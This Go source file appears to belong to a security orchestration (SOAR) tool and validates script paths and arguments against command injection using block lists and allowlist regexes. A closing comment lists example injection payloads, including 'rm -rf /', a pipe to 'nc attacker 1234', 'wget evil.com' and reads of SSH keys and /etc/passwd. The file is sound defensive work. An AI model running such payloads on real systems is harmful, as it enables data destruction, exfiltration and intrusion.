package soar

import (
	"fmt"
	"regexp"
	"strings"
)

// SECURITY REQUIREMENTS:
// FR-SOAR-017: Command Injection Prevention
// - Shell metacharacters MUST be rejected (not escaped)
// - Allowlist validation for script paths and arguments
// - Shell invocation PROHIBITED (no sh -c, bash -c, cmd.exe /c)
//
// THREAT MODEL: ATTACK-003 Command Injection
// Reference: docs/requirements/security-threat-model.md

// shellMetacharacters contains ALL shell metacharacters that MUST be blocked
// SECURITY: These characters can enable command injection attacks
// We REJECT rather than ESCAPE to prevent any possibility of bypasses
var shellMetacharacters = []rune{
	';',  // Command separator
	'|',  // Pipe
	'&',  // Background/AND
	'$',  // Variable expansion
	'`',  // Command substitution
	'\\', // Escape character
	'"',  // String delimiter
	'\'', // String delimiter
	'<',  // Input redirection
	'>',  // Output redirection
	'(',  // Subshell
	')',  // Subshell
	'{',  // Brace expansion
	'}',  // Brace expansion
	'[',  // Character class
	']',  // Character class
	'*',  // Glob wildcard
	'?',  // Glob wildcard
	'~',  // Home directory expansion
	'!',  // History expansion (bash)
	'#',  // Comment
	'\n', // Newline (command separator)
	'\r', // Carriage return
	'\t', // Tab (potential delimiter)
}

// scriptPathPattern is the allowlist regex for script paths
// SECURITY: Only allow safe characters in paths
// Pattern: ^[a-zA-Z0-9._/-]+$
// Allows: letters, digits, dot, underscore, forward slash, hyphen
// Blocks: spaces, special chars, environment variables, path traversal attempts
var scriptPathPattern = regexp.MustCompile(`^[a-zA-Z0-9._/-]+$`)

// argumentPattern is the allowlist regex for script arguments
// SECURITY: Only allow safe characters in arguments
// Pattern: ^[a-zA-Z0-9._:/@-]+$
// Allows: letters, digits, dot, underscore, colon, forward slash, at-sign, hyphen
// Blocks: spaces, quotes, shell metacharacters
var argumentPattern = regexp.MustCompile(`^[a-zA-Z0-9._:/@-]+$`)

// prohibitedShellCommands are shell wrappers that MUST NOT be executed
// SECURITY: These enable shell injection even with exec.Command
var prohibitedShellCommands = []string{
	"sh",
	"bash",
	"zsh",
	"ksh",
	"csh",
	"tcsh",
	"/bin/sh",
	"/bin/bash",
	"/bin/zsh",
	"/bin/ksh",
	"/bin/csh",
	"/bin/tcsh",
	"cmd.exe",
	"cmd",
	"powershell.exe",
	"powershell",
	"pwsh.exe",
	"pwsh",
}

// ValidateScriptPath validates a script path against the allowlist
// SECURITY: Prevents path traversal, environment variable injection, and shell metacharacters
//
// Requirements:
// - MUST match pattern: ^[a-zA-Z0-9._/-]+$
// - MUST NOT contain ".." (path traversal)
// - MUST NOT contain shell metacharacters
// - MUST NOT be a prohibited shell command
// - MUST NOT be empty
//
// Returns: error if validation fails, nil if valid
func ValidateScriptPath(path string) error {
	// Empty path check
	if path == "" {
		return fmt.Errorf("script path cannot be empty")
	}

	// Length check (prevent abuse)
	if len(path) > 512 {
		return fmt.Errorf("script path exceeds maximum length of 512 characters")
	}

	// Check for shell metacharacters (defense in depth)
	for _, char := range shellMetacharacters {
		if strings.ContainsRune(path, char) {
			return fmt.Errorf("script path contains prohibited shell metacharacter: %c", char)
		}
	}

	// Check for path traversal attempts
	if strings.Contains(path, "..") {
		return fmt.Errorf("script path contains path traversal sequence: ..")
	}

	// Allowlist validation
	if !scriptPathPattern.MatchString(path) {
		return fmt.Errorf("script path contains invalid characters (allowed: a-zA-Z0-9._/-)")
	}

	// Check for prohibited shell commands
	// Extract the command name (everything after last /)
	commandName := path
	if lastSlash := strings.LastIndex(path, "/"); lastSlash != -1 {
		commandName = path[lastSlash+1:]
	}
	// Also check the full path for Windows-style paths
	if lastBackslash := strings.LastIndex(path, "\\"); lastBackslash != -1 {
		commandName = path[lastBackslash+1:]
	}

	for _, prohibited := range prohibitedShellCommands {
		if commandName == prohibited || path == prohibited {
			return fmt.Errorf("script path is a prohibited shell command: %s", prohibited)
		}
	}

	return nil
}

// ValidateScriptArguments validates script arguments against the allowlist
// SECURITY: Prevents command injection through arguments
//
// Requirements:
// - Each argument MUST match pattern: ^[a-zA-Z0-9._:/@-]+$
// - Arguments MUST NOT contain shell metacharacters
// - Arguments MUST NOT be empty strings
// - Arguments MUST NOT contain spaces (would require quoting)
//
// Returns: error if validation fails, nil if all arguments valid
func ValidateScriptArguments(args []string) error {
	// Empty args array is valid (script with no arguments)
	if len(args) == 0 {
		return nil
	}

	// Limit number of arguments (prevent resource exhaustion)
	if len(args) > 100 {
		return fmt.Errorf("too many arguments: %d (maximum: 100)", len(args))
	}

	for i, arg := range args {
		// Empty argument check
		if arg == "" {
			return fmt.Errorf("argument %d is empty", i)
		}

		// Length check (prevent abuse)
		if len(arg) > 1024 {
			return fmt.Errorf("argument %d exceeds maximum length of 1024 characters", i)
		}

		// Check for shell metacharacters
		for _, char := range shellMetacharacters {
			if strings.ContainsRune(arg, char) {
				return fmt.Errorf("argument %d contains prohibited shell metacharacter: %c", i, char)
			}
		}

		// Allowlist validation
		if !argumentPattern.MatchString(arg) {
			return fmt.Errorf("argument %d contains invalid characters (allowed: a-zA-Z0-9._:/@-)", i)
		}
	}

	return nil
}

// SanitizeInput sanitizes user input by rejecting any input with shell metacharacters
// SECURITY: We REJECT rather than ESCAPE to prevent bypass attempts
//
// This function is used for general string inputs (not paths or arguments)
// For paths, use ValidateScriptPath
// For arguments, use ValidateScriptArguments
//
// Returns: sanitized string (same as input if valid), error if invalid
func SanitizeInput(input string) (string, error) {
	// Empty input is valid
	if input == "" {
		return "", nil
	}

	// Length check
	if len(input) > 4096 {
		return "", fmt.Errorf("input exceeds maximum length of 4096 characters")
	}

	// Check for shell metacharacters
	for _, char := range shellMetacharacters {
		if strings.ContainsRune(input, char) {
			return "", fmt.Errorf("input contains prohibited shell metacharacter: %c", char)
		}
	}

	// Check for NULL bytes (C string termination attack)
	if strings.ContainsRune(input, '\x00') {
		return "", fmt.Errorf("input contains NULL byte")
	}

	return input, nil
}

// ValidateShellProhibited validates that a command is not a prohibited shell
// SECURITY: Prevents execution of shell interpreters even with safe arguments
//
// This is called before exec.Command to ensure we never execute:
// - sh -c "command"
// - bash -c "command"
// - cmd.exe /c "command"
//
// Returns: error if command is prohibited shell, nil if safe
func ValidateShellProhibited(command string) error {
	if command == "" {
		return fmt.Errorf("command cannot be empty")
	}

	// Extract command name from path
	commandName := command
	if lastSlash := strings.LastIndex(command, "/"); lastSlash != -1 {
		commandName = command[lastSlash+1:]
	}
	if lastBackslash := strings.LastIndex(command, "\\"); lastBackslash != -1 {
		commandName = command[lastBackslash+1:]
	}

	// Check against prohibited list
	commandLower := strings.ToLower(commandName)
	for _, prohibited := range prohibitedShellCommands {
		if commandLower == strings.ToLower(prohibited) {
			return fmt.Errorf("prohibited shell command: %s (SECURITY: shell invocation is not allowed)", prohibited)
		}
	}

	return nil
}

// OWASP Command Injection Attack Patterns
// These are common attack vectors that MUST be blocked by validation
//
// Reference: OWASP Testing Guide v4 - Testing for Command Injection
// https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
//
// Examples that MUST be blocked:
// - "script.sh; rm -rf /"           (command separator)
// - "script.sh | nc attacker 1234"  (pipe)
// - "script.sh & wget evil.com"     (background)
// - "script.sh $(whoami)"            (command substitution)
// - "script.sh `whoami`"             (command substitution)
// - "script.sh > /etc/passwd"        (redirection)
// - "../../../etc/passwd"            (path traversal)
// - "$HOME/.ssh/id_rsa"              (environment variable)
// - "script.sh\n\nrm -rf /"          (newline injection)
